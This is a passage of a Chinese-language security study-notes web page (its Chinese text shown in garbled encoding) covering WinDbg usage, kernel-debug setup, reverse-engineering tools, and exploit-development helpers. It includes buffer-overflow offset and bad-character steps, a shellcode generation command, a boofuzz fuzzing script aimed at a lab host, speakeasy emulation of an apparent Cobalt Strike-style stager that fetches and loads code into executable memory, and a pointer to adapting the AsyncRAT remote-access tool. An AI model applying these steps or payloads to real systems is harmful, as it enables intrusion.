05 00000041`100fc9f0 00007ffc`04707bea     SHELL32!GetShellStyleHInstance+0xcc
06 00000041`100fcd20 00007ffc`04707ba0     SHELL32!UpdateStyle+0x1e
07 00000041`100fcd60 00007ffc`04707a93     SHELL32!DUI_ShellStyleSheet_InitProcess+0x94
08 00000041`100fcda0 00007ffc`0474c2d7     SHELL32!InitializeDirectUI+0x4b

</code></pre>
<ul>
<li>u æŸ¥çœ‹å½“å‰æ±‡ç¼–ä»£ç </li>
</ul>
<pre><code class="language-c">0:009&gt; u
ntdll!NtCreateFile+0x18:
00007ffc`0528fe18 0f1f840000000000 nop     dword ptr [rax+rax]
ntdll!NtQueryEvent:
00007ffc`0528fe20 4c8bd1          mov     r10,rcx
00007ffc`0528fe23 b856000000      mov     eax,56h
00007ffc`0528fe28 f604250803fe7f01 test    byte ptr [SharedUserData+0x308 (00000000`7ffe0308)],1
00007ffc`0528fe30 7503            jne     ntdll!NtQueryEvent+0x15 (00007ffc`0528fe35)
00007ffc`0528fe32 0f05            syscall
00007ffc`0528fe34 c3              ret
00007ffc`0528fe35 cd2e            int     2Eh

</code></pre>
<ul>
<li>r æŸ¥çœ‹å¯„å­˜å™¨</li>
</ul>
<pre><code class="language-C">0:009&gt; r
rax=0000000000000005 rbx=0000000000000000 rcx=00000041100fc5e0
rdx=0000000080100080 rsi=0000000000000000 rdi=0000000000000000
rip=00007ffc0528fe00 rsp=00000041100fc558 rbp=00000041100fc660
 r8=00000041100fc640  r9=00000041100fc5e8 r10=ce709ee7125b9070
r11=00000041100fc540 r12=0000000000000001 r13=0000000000000000
r14=0000000080100080 r15=0000000000000000
iopl=0         nv up ei ng nz na pe nc
cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00000282
ntdll!NtCreateFile:
00007ffc`0528fe00 4c8bd1          mov     r10,rcx
0:009&gt; r al
al=5
0:009&gt; r eax
eax=5
0:009&gt; r rax
rax=0000000000000005

</code></pre>
<ul>
<li>d æŸ¥çœ‹å†…å­˜</li>
</ul>
<pre><code class="language-C">0:009&gt; d
00007ffc`0528fe00  4c 8b d1 b8 55 00 00 00-f6 04 25 08 03 fe 7f 01  L...U.....%.....
00007ffc`0528fe10  75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00  u...............
00007ffc`0528fe20  4c 8b d1 b8 56 00 00 00-f6 04 25 08 03 fe 7f 01  L...V.....%.....
00007ffc`0528fe30  75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00  u...............
00007ffc`0528fe40  4c 8b d1 b8 57 00 00 00-f6 04 25 08 03 fe 7f 01  L...W.....%.....
00007ffc`0528fe50  75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00  u...............
00007ffc`0528fe60  4c 8b d1 b8 58 00 00 00-f6 04 25 08 03 fe 7f 01  L...X.....%.....
00007ffc`0528fe70  75 03 0f 05 c3 cd 2e c3-0f 1f 84 00 00 00 00 00  u...............

</code></pre>
<ul>
<li>x åŒ¹é…ç¬¦å·ï¼Œå¯ç”¨æ¥æŸ¥æ‰¾å‡½æ•°åœ°å€</li>
</ul>
<pre><code class="language-C">0:009&gt; x ntdll!createf*
Breakpoint 0 hit
ntdll!NtCreateFile:
00007ffc`0528fe00 4c8bd1          mov     r10,rcx
</code></pre>
<ul>
<li>bpã€buã€bm è®¾ç½®æ–­ç‚¹
æ ¹æ®åœ°å€æ–­ç‚¹
1.æ ¹æ®é™æ€æ‰¾åˆ°åç§»é‡
2.æŸ¥çœ‹å½“å‰æ¨¡å—è™šæ‹Ÿåœ°å€+åç§»é‡æ–­ç‚¹</li>
</ul>
<pre><code class="language-C">0:002&gt; lm
start             end                 module name
00007ff6`07c20000 00007ff6`07c36000   a        T (no symbols)           
00007ffb`ff880000 00007ffb`ff917000   apphelp    (deferred)             
00007ffc`02a30000 00007ffc`02dd5000   KERNELBASE   (deferred)             
00007ffc`02fc0000 00007ffc`03084000   KERNEL32   (pdb symbols)          E:\Windows Kits\10\Debuggers\x64\sym\kernel32.pdb\6F7660385E7D8D33ED9B5A39B03822F01\kernel32.pdb
00007ffc`04f60000 00007ffc`05007000   msvcrt     (deferred)             
00007ffc`051f0000 00007ffc`05407000   ntdll      (pdb symbols)          E:\Windows Kits\10\Debuggers\x64\sym\ntdll.pdb\58A282C24AEE7E03A8CF8CB0A782CE0C1\ntdll.pdb

0:002&gt; u 00007ff6`07c214c7
a+0x14c7:
00007ff6`07c214c7 e8c7ffffff      call    a+0x1493 (00007ff6`07c21493)
00007ff6`07c214cc 4889ca          mov     rdx,rcx
00007ff6`07c214cf 8a02            mov     al,byte ptr [rdx]
00007ff6`07c214d1 4883c202        add     rdx,2
00007ff6`07c214d5 84c0            test    al,al
00007ff6`07c214d7 7407            je      a+0x14e0 (00007ff6`07c214e0)
00007ff6`07c214d9 83e00f          and     eax,0Fh
00007ff6`07c214dc 01c6            add     esi,eax
0:002&gt; bp 00007ff6`07c214c7

</code></pre>
<ul>
<li>æ‰¹é‡æ–­ç‚¹</li>
</ul>
<pre><code class="language-C">0:000&gt; bm ntdll!ZwTer*
  2: 00007ffc`05292d30 @!&quot;ntdll!ZwTerminateJobObject&quot;
  3: 00007ffc`05292d10 @!&quot;ntdll!ZwTerminateEnclave&quot;
  4: 00007ffc`0528fdc0 @!&quot;ntdll!ZwTerminateThread&quot;
  5: 00007ffc`0528f8e0 @!&quot;ntdll!ZwTerminateProcess&quot;
0:000&gt; bl
     1 e Disable Clear  00007ff6`07c214cc     0001 (0001)  0:**** a+0x14cc
     2 e Disable Clear  00007ffc`05292d30     0001 (0001)  0:**** ntdll!NtTerminateJobObject
     3 e Disable Clear  00007ffc`05292d10     0001 (0001)  0:**** ntdll!NtTerminateEnclave
     4 e Disable Clear  00007ffc`0528fdc0     0001 (0001)  0:**** ntdll!NtTerminateThread
     5 e Disable Clear  00007ffc`0528f8e0     0001 (0001)  0:**** ntdll!NtTerminateProcess

</code></pre>
<ul>
<li>æœç´¢å†…å­˜ç©ºé—´</li>
</ul>
<pre><code class="language-C">0:000&gt; s -a 0 L?0x00007ff6ffffffff &quot;aaaaaaaa&quot;
000000ad`83dffc4c  61 61 61 61 61 61 61 61-00 00 00 00 00 00 00 00  aaaaaaaa........
</code></pre>
<ul>
<li>æ•°æ®ç±»å‹è½¬æ¢</li>
</ul>
<pre><code class="language-C">0:000&gt; .formats 6161616161616262
Evaluate expression:
  Hex:     61616161`61616262
  Decimal: 7016996765293437538
  Octal:   0605413026054130261142
  Binary:  01100001 01100001 01100001 01100001 01100001 01100001 01100010 01100010
  Chars:   aaaaaabb
  Time:    Sat Dec 24 08:48:49.343 23836 (UTC + 8:00)
  Float:   low 2.5985e+020 high 2.59846e+020
  Double:  1.22176e+161

</code></pre>
<ul>
<li>å†…å­˜çŠ¶æ€</li>
</ul>
<pre><code class="language-c">0:000&gt; !address


Mapping file section regions...
Mapping module regions...
Mapping PEB regions...
Mapping TEB and stack regions...
Mapping heap regions...
Mapping page heap regions...
Mapping other regions...
Mapping stack trace database regions...
Mapping activation context regions...

        BaseAddress      EndAddress+1        RegionSize     Type       State                 Protect             Usage
--------------------------------------------------------------------------------------------------------------------------
+        0`00000000        0`7ffe0000        0`7ffe0000             MEM_FREE                                       Free       
+        0`7ffe0000        0`7ffe1000        0`00001000 MEM_PRIVATE MEM_COMMIT                                     Other      [User Shared Data]
+        0`7ffe1000        0`7ffe6000        0`00005000             MEM_FREE                                       Free       
+        0`7ffe6000        0`7ffe7000        0`00001000 MEM_PRIVATE MEM_COMMIT                                     &lt;unknown&gt;  [..........O...H.]
+        0`7ffe7000       ad`83a00000       ad`03a19000             MEM_FREE                                       Free       
+       ad`83a00000       ad`83af0000        0`000f0000 MEM_PRIVATE MEM_RESERVE                                    &lt;unknown&gt;  
        ad`83af0000       ad`83af1000        0`00001000 MEM_PRIVATE MEM_COMMIT                                     PEB        [3e3c]
        ad`83af1000       ad`83af3000        0`00002000 MEM_PRIVATE MEM_COMMIT                                     TEB        [~0; 3e3c.517c]
        ad`83af3000       ad`83af5000        0`00002000 MEM_PRIVATE MEM_COMMIT                                     TEB        [~1; 3e3c.211c]
        ad`83af5000       ad`83c00000        0`0010b000 MEM_PRIVATE MEM_RESERVE                                    &lt;unknown&gt;  
+       ad`83c00000       ad`83dfa000        0`001fa000 MEM_PRIVATE MEM_RESERVE                                    Stack      [~0; 3e3c.517c]
        ad`83dfa000       ad`83dfd000        0`00003000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE | PAGE_GUARD        Stack      [~0; 3e3c.517c]
        ad`83dfd000       ad`83e00000        0`00003000 MEM_PRIVATE MEM_COMMIT                                     Stack      [~0; 3e3c.517c]
+       ad`83e00000       ad`83ffc000        0`001fc000 MEM_PRIVATE MEM_RESERVE                                    Stack      [~1; 3e3c.211c]
        ad`83ffc000       ad`83fff000        0`00003000 MEM_PRIVATE MEM_COMMIT  PAGE_READWRITE | PAGE_GUARD        Stack      [~1; 3e3c.211c]
        ad`83fff000       ad`84000000        0`00001000 MEM_PRIVATE MEM_COMMIT                                     Stack      [~1; 3e3c.211c]

</code></pre>
<h3 id="debug-kernel">debug kernel</h3>
<pre><code>\\.\pipe\pa

bcdedit /debug on
bcdedit /dbgsettings serial debugport:2 baudrate:115200

bcdedit /dbgsettings NET HOSTIP:1.1.1.1 PORT:50000

bcdedit /dbgsettings serial debugport:2 baudrate:115200

</code></pre>
<h1 id="_46">ä¹¦ç±å·¥å…·</h1>
<h2 id="reverse-engineering-for-beginners">Reverse Engineering for Beginners</h2>
<h2 id="windows_1">Windows ä»¤ç‰Œç›¸å…³å­¦ä¹ </h2>
<p>https://github.com/daem0nc0re/PrivFu/</p>
<h2 id="_47">å·¥å…·</h2>
<h4 id="_48">åœ¨çº¿æºç æ±‡ç¼–äº’è½¬å·¥å…·</h4>
<p>https://godbolt.org/</p>
<h4 id="pe-tools">PE Tools</h4>
<p>çœ‹peçš„</p>
<h4 id="file">file</h4>
<p><code>file 1.exe</code><br />
çœ‹æ–‡ä»¶æ ¼å¼ç±»å‹çš„ï¼Œæ ¹æ®æ–‡ä»¶å¤´çš„æ–‡ä»¶å¹»æ•°æ¥æ£€æŸ¥ã€‚
ä»€ä¹ˆæ˜¯å¹»æ•°ï¼Ÿå¹»æ•°å°±æ˜¯ä¸åŒæ ¼å¼æ–‡ä»¶çš„æŒ‡çº¹ï¼Œä¾‹å¦‚MZæ˜¯PEæ–‡ä»¶çš„æŒ‡çº¹ï¼Œ16è¿›åˆ¶å¹»æ•°æ˜¯<code>4D 5A</code></p>
<h4 id="ldd">ldd</h4>
<p><code>ldd 1.exe</code></p>
<p>çœ‹åŠ¨æ€é“¾æ¥ç¨‹åºéœ€è¦å“ªäº›é“¾æ¥åº“çš„</p>
<h4 id="dumpbin">dumpbin</h4>
<p>vscodeè‡ªå¸¦çš„ç¨‹åº</p>
<pre><code>dumpbin.exe /imports 1.exe
dumpbin.exe /exports 1.exe
dumpbin /dependents 1.exe   è¿™ä¸ªè·Ÿlddä¸€æ ·


</code></pre>
<h4 id="string">string</h4>
<p>æŸ¥çœ‹å­—ç¬¦ä¸²</p>
<h4 id="speakeasy">speakeasy</h4>
<p>æ¨¡æ‹Ÿshellcodeè¿è¡Œï¼Œå¯ç”¨äºæŸ¥æ‰¾CS profileçš„åœ°å€ã€è¯·æ±‚ä¿¡æ¯ç­‰
https://github.com/mandiant/speakeasy</p>
<h4 id="asyncrat-c-sharp">AsyncRAT-C-Sharp</h4>
<p>ä¸€æ¬¾å¼€æºè¿œæ§ï¼Œå¯ä»¥äºŒå¼€ä¸€ä¸‹æ”¹ç€è‡ªå·±ç©---å¾…åŠ
https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp</p>
<h2 id="_49">å‚è€ƒèµ„æ–™</h2>
<h3 id="interpdf">Interæ¶æ„æ‰‹å†Œ.pdf</h3>
<p>https://www.intel.cn/content/www/cn/zh/developer/articles/technical/intel-sdm.html</p>
<h1 id="_50">å‘½ä»¤</h1>
<h2 id="pattern">pattern</h2>
<p>msf-pattern_create  //ç”ŸæˆæŒ‡å®šé•¿åº¦çš„æ•°æ®</p>
<pre><code>Usage: msf-pattern_create [options]
Example: msf-pattern_create -l 50 -s ABC,def,123
Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf

Options:
    -l, --length &lt;length&gt;            The length of the pattern
    -s, --sets &lt;ABC,def,123&gt;         Custom Pattern Sets
    -h, --help                       Show this message



</code></pre>
<ul>
<li>è®¡ç®—åç§»é‡
è¿™æ˜¯æ ¹æ®msfè‡ªå·±ç”Ÿæˆçš„å”¯ä¸€å­—ç¬¦ä¸²æ¥å®šä½çš„, <code>-q</code>ç»™å­—ç¬¦ä¸²çš„16è¿›åˆ¶ï¼Œå·¥å…·ä¼šè‡ªåŠ¨è®¡ç®—å‡ºEIPçš„åç§»é‡</li>
</ul>
<pre><code>â””â”€# msf-pattern_offset -q 00696CA9                                              
[*] Exact match at offset 146
</code></pre>
<ul>
<li>æ‰€æœ‰å­—ç¬¦</li>
</ul>
<pre><code>\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff
</code></pre>
<h2 id="nasm">nasm</h2>
<ul>
<li>æ±‡ç¼–æŒ‡ä»¤è½¬16è¿›åˆ¶
ä½¿ç”¨MSFçš„è‡ªå¸¦å·¥å…·
<code>/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb</code></li>
</ul>
<pre><code>nasm &gt; jmp esp
00000000  FFE4              jmp esp
nasm &gt; call esp
00000000  FFD4              call esp
</code></pre>
<ul>
<li>ç¼“å†²åŒºæº¢å‡ºshellcodeç”Ÿæˆ</li>
</ul>
<pre><code>generate -b &quot;\x00\x0a\x0d&quot;
</code></pre>
<h2 id="ropper">Ropper</h2>
<p>ROPé“¾å¯»æ‰¾å·¥å…·</p>
<p>https://github.com/sashs/Ropper</p>
<h1 id="_51">å·¥å…·</h1>
<pre><code>Ghidraã€IDA
</code></pre>
<h2 id="boofuzz">boofuzzä½¿ç”¨</h2>
<p>å®˜æ–¹æŒ‡å— https://boofuzz.readthedocs.io/</p>
<p>æ³¨æ„ï¼šè„šæœ¬åç§°ä¸èƒ½æ˜¯boofuzz.pyï¼Œå¦åˆ™ä¼šæœ‰å¼‚å¸¸</p>
<p>å®‰è£…boofuzz</p>
<pre><code>python3 -m pip install boofuzz
</code></pre>
<p>ä¸€ä¸ªå®Œæ•´çš„æ ·ä¾‹è„šæœ¬å¦‚ä¸‹</p>
<pre><code class="language-py">#!/usr/bin/python

from boofuzz import *

host = '192.168.14.139'
port = 9999

def main():

    ses = Session(target = Target(connection = SocketConnection(host, port, proto='tcp')), sleep_time = 3, web_address = '0.0.0.0')

    s_initialize(&quot;TEST&quot;)  # åˆå§‹åŒ–è¯·æ±‚

    s_string(&quot;TRUN&quot;, fuzzable=False) #  å‘é€å­—ç¬¦ä¸²åˆ°æ ˆ fuzzable=False å­—ç¬¦ä¸²ä¸å˜
    s_delim(&quot; &quot;, fuzzable=False)    # å‘é€åˆ†éš”ç¬¦åˆ°æ ˆ fuzzable=False åˆ†éš”ç¬¦ä¸å˜
    s_string(&quot;FUZZ&quot;)                # å‘é€å­—ç¬¦ä¸²åˆ°æ ˆ è¿™æ®µå†…å®¹æ˜¯fuzzéƒ¨åˆ†

    ses.connect(s_get(&quot;TEST&quot;))      # åˆ›å»ºä¸€ä¸ªè¿æ¥ æ¥æ”¶å›è°ƒ
    ses.fuzz()                      # å¼€å§‹fuzz

if __name__ == &quot;__main__&quot;:
    main()
</code></pre>
<h2 id="x64dbgmona">x64dbgå®‰è£…monaæ’ä»¶</h2>
<p>x32å’Œx64æ˜¯åˆ†åˆ«å®‰è£…çš„</p>
<pre><code>https://github.com/x64dbg/x64dbgpy/releases/download/3177a3ef/python-2.7.11.msi
https://github.com/x64dbg/x64dbgpy/releases/download/3177a3ef/python-2.7.11.amd64.msi

1ã€å®‰è£…x64dbgpyæ’ä»¶æ”¯æŒpython
ä¸‹è½½https://github.com/x64dbg/x64dbgpy/releases/download/8c0538a/x64dbgpy_8c0538a.zip
è§£å‹è¦†ç›–åˆ°å®‰è£…ç›®å½•

2ã€å®‰è£…mona
ä¸‹è½½åœ°å€
https://github.com/x64dbg/mona
mona.pyå¤åˆ¶åˆ°plugins/x64dbgpyä¸­

ä¸‹è½½
https://github.com/x64dbg/x64dbgpylib
å¤åˆ¶åˆ°plugins/x64dbgpyä¸­

clean_mona.pyå¤åˆ¶åˆ°x64dbgpy/x64dbgpy/autorunä¸­

</code></pre>
<h2 id="speakeasy_1">speakeasy</h2>
<p>æ¨¡æ‹Ÿshellcode</p>
<pre><code>root@1:/home/popo# speakeasy -t payload.bin -r -a x64
* exec: shellcode
0x10ef: 'kernel32.LoadLibraryA(&quot;wininet&quot;)' -&gt; 0x7bc00000
0x1107: 'wininet.InternetOpenA(0x0, 0x0, 0x0, 0x0, 0x0)' -&gt; 0x20
0x1129: 'wininet.InternetConnectA(0x20, &quot;192.168.14.128&quot;, 0x1bb, 0x0, 0x0, 0x3, 0x0, 0x0)' -&gt; 0x24
0x1148: 'wininet.HttpOpenRequestA(0x24, 0x0, &quot;/jquery-3.3.2.slim.min.js&quot;, 0x0, 0x0, 0x0, &quot;INTERNET_FLAG_DONT_CACHE | INTERNET_FLAG_IGNORE_CERT_CN_INVALID | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID | INTERNET_FLAG_KEEP_CONNECTION | INTERNET_FLAG_NO_UI | INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE&quot;, 0x0)' -&gt; 0x28
0x1172: 'wininet.InternetSetOptionA(0x28, 0x1f, 0x1203ec0, 0x4)' -&gt; 0x1
0x118c: 'wininet.HttpSendRequestA(0x28, &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\\nAccept-Language: en-US,en;q=0.5\r\\nReferer: http://code.jquery.com/\r\\nAccept-Encoding: gzip, deflate\r\\nUser-Agent: Mozilla/5.0 (Windows NT 6.3; Trident/7.0; rv:11.0) like Gecko\r\\n&quot;, 0xffffffffffffffff, 0x0, 0x11f9)' -&gt; 0x1
0x134d: 'kernel32.VirtualAlloc(0x0, 0x400000, 0x1000, &quot;PAGE_EXECUTE_READWRITE&quot;)' -&gt; 0x450000
0x136b: 'wininet.InternetReadFile(0x28, 0x450000, 0x2000, 0x1203e40)' -&gt; 0x1
0x136b: 'wininet.InternetReadFile(0x28, 0x451000, 0x2000, 0x1203e40)' -&gt; 0x1
0x450fb0: Unhandled interrupt: intnum=0x3
0x450fb0: shellcode: Caught error: unhandled_interrupt
* Finished emulating
</code></pre>
<p>æ¨¡æ‹Ÿé©±åŠ¨</p>
<pre><code>root@1:/home/popo# speakeasy -t HEVD.sys
* exec: 27
0x14008a035: 'ntoskrnl.RtlInitUnicodeString(0x1200f68, &quot;\\Device\\HackSysExtremeVulnerableDriver&quot;)' -&gt; None
0x14008a046: 'ntoskrnl.RtlInitUnicodeString(0x1200f58, &quot;\\DosDevices\\HackSysExtremeVulnerableDriver&quot;)' -&gt; None
0x14008a071: 'ntoskrnl.IoCreateDevice(0x7eb870, 0x0, &quot;\\Device\\HackSysExtremeVulnerableDriver&quot;, 0x22, 0x100, 0x0, 0x1200f98)' -&gt; 0x0
0x14008a0ef: 'ntoskrnl.IoCreateSymbolicLink(&quot;\\DosDevices\\HackSysExtremeVulnerableDriver&quot;, &quot;\\Device\\HackSysExtremeVulnerableDriver&quot;)' -&gt; 0x0
0x14008a10d: 'ntoskrnl.DbgPrintEx(0x4d, 0x3, &quot;                                        \\n ##     ## ######## ##     ## ########  \\n ##     ## ##       ##     ## ##     ## \\n ##     ## ##       ##     ## ##     ## \\n ######### ######   ##     ## ##     ## \\n ##     ## ##        ##   ##  ##     ## \\n ##     ## ##         ## ##   ##     ## \\n ##     ## ########    ###    ########  \\n   HackSys Extreme Vulnerable Driver    \\n             Version: 3.00              \\n&quot;)' -&gt; 0x19a
0x14008a122: 'ntoskrnl.DbgPrintEx(0x4d, 0x3, &quot;[+] HackSys Extreme Vulnerable Driver Loaded\\n&quot;)' -&gt; 0x2d
* exec: 0
0x140085070: 'ntoskrnl.IofCompleteRequest(0x7ebb20, 0x0)' -&gt; None
* exec: 14
0x1400855f0: 'ntoskrnl.DbgPrintEx(0x4d, 0x3, &quot;[-] Invalid IOCTL Code: 0x0\\n&quot;)' -&gt; 0x1c
0x14008572e: 'ntoskrnl.IofCompleteRequest(0x7ebc90, 0x0)' -&gt; None
* exec: 3
0x140085767: 'ntoskrnl.IofCompleteRequest(0x7ebe00, 0x0)' -&gt; None
* exec: 4
0x140085767: 'ntoskrnl.IofCompleteRequest(0xbd4000, 0x0)' -&gt; None
* exec: 2
0x140085070: 'ntoskrnl.IofCompleteRequest(0xbd4170, 0x0)' -&gt; None
* exec: 18
0x140085767: 'ntoskrnl.IofCompleteRequest(0xbd42e0, 0x0)' -&gt; None
* exec: 28
0x140085027: 'ntoskrnl.RtlInitUnicodeString(0x1200f98, &quot;\\DosDevices\\HackSysExtremeVulnerableDriver&quot;)' -&gt; None
0x140085032: 'ntoskrnl.IoDeleteSymbolicLink(&quot;\\DosDevices\\HackSysExtremeVulnerableDriver&quot;)' -&gt; 0x0
0x14008503c: 'ntoskrnl.IoDeleteDevice(0x3fd000)' -&gt; 0x0
0x140085051: 'ntoskrnl.DbgPrintEx(0x4d, 0x3, &quot;[-] HackSys Extreme Vulnerable Driver Unloaded\\n&quot;)' -&gt; 0x2f
* Finished emulating
</code></pre>
<h1 id="_52">ä¹¦ç±</h1>
<p>https://alice.climent-pommeret.red/posts/a-syscall-journey-in-the-windows-kernel/</p>
<h1 id="_53">å†çœ‹</h1>
<p>https://www.x86matthew.com/view_post?id=create_svc_rpc</p>
<p>å¼‚å½¢PEæ–‡ä»¶
https://secret.club/2023/06/05/spoof-pe-sections.html</p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Linux%E5%AE%89%E5%85%A8%E7%AC%94%E8%AE%B0/" class="btn btn-xs btn-link">
        Linuxå®‰å…¨ç¬”è®°
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../../Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../../Web%E7%9B%B8%E5%85%B3/K8s%E6%94%BB%E5%87%BB%E9%9D%A2/" class="btn btn-xs btn-link">
        K8sæ”»å‡»é¢
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="container-fluid wm-page-content">
  <p>Documentation built with <a href="https://www.mkdocs.org/">MkDocs</a> using <a href="https://github.com/gristlabs/mkdocs-windmill">Windmill</a> theme by Grist Labs.</p>
</footer>

</body>
</html>